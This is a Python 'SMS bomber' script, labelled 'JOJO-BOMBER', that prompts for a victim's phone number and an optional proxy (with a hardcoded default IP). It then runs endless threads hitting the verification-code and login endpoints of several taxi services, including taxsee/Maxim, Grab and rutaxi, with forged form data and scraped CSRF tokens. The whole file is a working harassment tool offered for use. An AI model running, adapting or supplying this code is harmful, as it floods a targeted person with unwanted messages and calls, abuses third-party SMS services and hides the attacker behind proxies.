def_proxy = '111.67.92.66:8080'

class col:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

import requests, time, sys

try:
    import thread
except ImportError:
    import _thread as thread

print('{}              ...                              {}'.format(col.FAIL, col.ENDC))          
print('{}             ;::::;                            {}'.format(col.FAIL, col.ENDC))          
print('{}           ;::::; :;                           {}'.format(col.FAIL, col.ENDC))          
print('{}         ;:::::\'   :;                          {}'.format(col.FAIL, col.ENDC))          
print('{}        ;:::::;     ;.                         {}'.format(col.FAIL, col.ENDC))          
print('{}       ,:::::\'       ;           OOO\          {}'.format(col.FAIL, col.ENDC))          
print('{}       ::::::;       ;          OOOOO\\        {}'.format(col.FAIL, col.ENDC))          
print('{}      ;:::::;       ;         OOOOOOOO         {}'.format(col.FAIL, col.ENDC))          
print('{}      ,;::::::;     ;\'         / OOOOOOO       {}'.format(col.FAIL, col.ENDC))          
print('{}    ;:::::::::`. ,,,;.        /  / DOOOOOO     {}'.format(col.FAIL, col.ENDC))          
print('{}  .\';:::::::::::::::::;,     /  /     DOOOO    {}'.format(col.FAIL, col.ENDC))          
print('{} ,::::::;::::::;;;;::::;,   /  /        DOOO   {}'.format(col.FAIL, col.ENDC))          
print('{};`::::::`\'::::::;;;::::: ,\#/  /          DOOO {}'.format(col.FAIL, col.ENDC))          
print('{}:`:::::::`;::::::;;::: ;::#  /            DOOO{}'.format(col.FAIL, col.ENDC))          
print('{}::`:::::::`;:::::::: ;::::# /              DOO{}'.format(col.FAIL, col.ENDC))          
print('{}`:`:::::::`;:::::: ;::::::#/               DOO{}'.format(col.FAIL, col.ENDC))          
print('{} :::`:::::::`;; ;:::::::::##                OO{}'.format(col.FAIL, col.ENDC))          
print('{} ::::`:::::::`;::::::::;:::#                OO{}'.format(col.FAIL, col.ENDC))          
print('{} `:::::`::::::::::::;\'`:;::\#                O {}'.format(col.FAIL, col.ENDC))          
print('{}  `:::::`::::::::;\' /  / `:\#                  {}'.format(col.FAIL, col.ENDC))          
print('{}   ::::::`:::::;\'  /  /   `\#                   {}\n'.format(col.FAIL, col.ENDC))              

print('{}------------------------------{}'.format(col.FAIL, col.ENDC))
print('{}$ YES, IT IS A JOJO-BOMBER!!1 ${}'.format(col.FAIL, col.ENDC))
print('{}$ I WANT ZAWARUDOOOOOOOOOO    ${}'.format(col.FAIL, col.ENDC))
print('{}$       N e T v o S I         ${}'.format(col.FAIL, col.ENDC))
print('{}------------------------------{}\n'.format(col.FAIL, col.ENDC))

try:
    phone = input(col.WARNING + '[*] Type a phone number [*]\n' + col.ENDC)
except:
    print(col.FAIL + '[!] Print a phone number [!]' + col.ENDC)
    exit()

try:
    proxy = input(col.WARNING + '[*] Type a proxy (ENTER TO SKIP OR TYPE def TO DEFAULT) [*]\n' + col.ENDC)
    if proxy == 'def':
        proxy = def_proxy
    if proxy == '':
        proxy = None
        0/0
except:
    proxy = None
    print(col.OKBLUE + '[~] Mode without proxy [~]' + col.ENDC)

s = requests.Session()
s.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36'}
s.cookies.update({'cookie-policy': '1'})

def getip():
    try:
        req = s.get('https://api.ipify.org?format=json', proxies={'http': str(proxy), 'https': str(proxy)}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
    except:
        print(col.FAIL + '[~] Whoooops, something wrong [~]' + col.ENDC)
    print(col.OKGREEN + '[OK] Mode with proxy. IP: {} [OK]{}'.format(req.json()['ip'], col.ENDC))

def sleep(x):
    try:
        time.sleep(x)
    except KeyboardInterrupt:
        print(col.FAIL + '[!] KeyboardInterrupt thrown [!]' + col.ENDC)
        exit()

def spam(_type, _url, _data, _headers, _delay, _proxy=None, _cookies=None):
    while True:
        if _type == 'post':
            if _proxy == None:
                try:
                    r = s.post(_url, data=_data, headers=_headers, cookies=_cookies)
                    print('{}{}{}'.format(col.OKBLUE, r.text[0:64].replace('\n', '',).replace(' ', '',), col.ENDC))
                except:
                    print(col.FAIL + '[~] Whoooops, something wrong [~]' + col.ENDC)
                sleep(_delay)
            else:
                try:
                    r = s.post(_url, data=_data, headers=_headers, proxies={'http': str(_proxy), 'https': str(_proxy)}, cookies=_cookies)
                    print('{}{}{}'.format(col.OKBLUE, r.text[0:64].replace('\n', '').replace(' ', '',), col.ENDC))
                except:
                    print(col.FAIL + '[~] Whoooops, something wrong [~]' + col.ENDC)
                sleep(_delay)
        elif _type == 'get':
            if _proxy == None:
                try:
                    r = s.get(_url, data=_data, headers=_headers, cookies=_cookies)
                    print('{}{}{}'.format(col.OKBLUE, r.text[0:64].replace('\n', '').replace(' ', '',), col.ENDC))
                except:
                    print(col.FAIL + '[~] Whoooops, something wrong [~]' + col.ENDC)
                sleep(_delay)
            else:
                try:
                    r = s.get(_url, data=_data, headers=_headers, proxies={'http': str(_proxy), 'https': str(_proxy)}, cookies=_cookies)
                    print('{}{}{}'.format(col.OKBLUE, r.text[0:64].replace('\n', '').replace(' ', '',), col.ENDC))
                except:
                    print(col.FAIL + '[~] Whoooops, something wrong [~]' + col.ENDC)
                sleep(_delay)

if proxy != None:
    getip()

r = s.get('https://taximaxim.ru/')
r = s.get('https://client.taxsee.com/claim/ru/ru/6?tax-id=SrvMpYHWr%2FWymRmBUdoa6isCaQcmnFtb0xmL4kP74iIgk8vmpGZoL%2BOsQU0m3lMOMwpCkSyA%2FU4qVJmAQaXbTw%3D%3D')
r = s.get('https://client.taxsee.com/frame/?tax-id=7XBwEIfK7rDnltoQTdtTpA3b2pGjwWBcnJ4hAJ7%2FTyPzLm3S97K6G78CT%2BdehaCEt2egld9yvQs5AncsvOtXkg%3D%3D&fp=fc3696e401d84bb8ad9d81689fca7d67&c=ru&l=ru&b=2097&theme=taxsee')
r = s.get('https://client.taxsee.com/frame/?tax-id=SrvMpYHWr%2FWymRmBUdoa6isCaQcmnFtb0xmL4kP74iIgk8vmpGZoL%2BOsQU0m3lMOMwpCkSyA%2FU4qVJmAQaXbTw%3D%3D&fp=4b09e72a10c189798c9991d26fb4279e&c=ru&l=ru&b=6&p=1&theme=maximV2')
thread.start_new_thread(spam, ('post', 'https://client.taxsee.com/site/send-code/?type=0&tax-id=SrvMpYHWr%2FWymRmBUdoa6isCaQcmnFtb0xmL4kP74iIgk8vmpGZoL%2BOsQU0m3lMOMwpCkSyA%2FU4qVJmAQaXbTw%3D%3D', {'_csrf': s.cookies.get('_csrf', domain='taximaxim.ru'), 'LoginForm[org]': 'maxim', 'LoginForm[country]': 'ru', 'LoginForm[baseId]': '6', 'LoginForm[phone]': '+{}({}){}-{}-{}'.format(phone[:1], phone[1:4], phone[4:7], phone[7:9], phone[9:11]), 'LoginForm[code]': None}, None, 120))
sleep(10)
r = s.get('http://taxi-61.ru/')
r = s.get('https://client.taxsee.com/frame/?tax-id=7XBwEIfK7rDnltoQTdtTpA3b2pGjwWBcnJ4hAJ7%2FTyPzLm3S97K6G78CT%2BdehaCEt2egld9yvQs5AncsvOtXkg%3D%3D&fp=fc3696e401d84bb8ad9d81689fca7d67&c=ru&l=ru&b=2097&theme=taxsee')
thread.start_new_thread(spam, ('post', 'https://client.taxsee.com/order-form/send-code/?type=0&tax-id=7XBwEIfK7rDnltoQTdtTpA3b2pGjwWBcnJ4hAJ7%2FTyPzLm3S97K6G78CT%2BdehaCEt2egld9yvQs5AncsvOtXkg%3D%3D', {'_csrf': s.cookies.get('_csrf', domain='taxi-61.ru'), 'LoginForm[org]': '61rostov', 'LoginForm[country]': 'ru', 'LoginForm[baseId]': '2097', 'LoginForm[phone]': '+{}({}){}-{}-{}'.format(phone[:1], phone[1:4], phone[4:7], phone[7:9], phone[9:11]), 'LoginForm[code]': None}, None, 120))
sleep(10)
thread.start_new_thread(spam, ('post', 'https://p.grabtaxi.com/api/passenger/v2/profiles/register', {'phoneNumber': phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com', 'deviceToken': '*'}, None, 30, proxy))
sleep(10)
thread.start_new_thread(spam, ('get', 'http://one.dyndns.ws/weborder/json_requestpin.php?type=request&phone=8{}&_=1551254312481'.format(phone[1:]), None, None, 50, proxy))
sleep(10)
thread.start_new_thread(spam, ('post', 'https://rostov.rutaxi.ru/ajax_auth.html', {'l': phone[1:], 'p': None, 'rem': '0', 'c': '3'}, {'Referer': 'https://rostov.rutaxi.ru/index.html?state=opendialog&name=dialog_login'}, 30, proxy))
sleep(10)
thread.start_new_thread(spam, ('post', 'https://rostov.rutaxi.ru/ajax_auth.html', {'l': phone[1:], 'p': None, 'callme': '1', 'rem': '1'}, {'Referer': 'https://rostov.rutaxi.ru/index.html?state=opendialog&name=dialog_login'}, 30, proxy))
r = s.get ('http://www.taxitroyka.ru/')
thread.start_new_thread(spam, ('post', 'https://client.taxsee.com/site/send-code/?type=0&tax-id=SrvMpYHWr%2FWymRmBUdoa6isCaQcmnFtb0xmL4kP74iIgk8vmpGZoL%2BOsQU0m3lMOMwpCkSyA%2FU4qVJmAQaXbTw%3D%3D', {'_csrf': s.cookies.get('_csrf', domain='taxitroyka.ru'), 'LoginForm[org]': 'troyka', 'LoginForm[country]': 'ru', 'LoginForm[baseId]': '6', 'LoginForm[phone]': '+{}({}){}-{}-{}'.format(phone[:1], phone[1:4], phone[4:7], phone[7:9], phone[9:11]), 'LoginForm[code]': None}, None, 120))
sleep(10)

while True:
    sleep(300)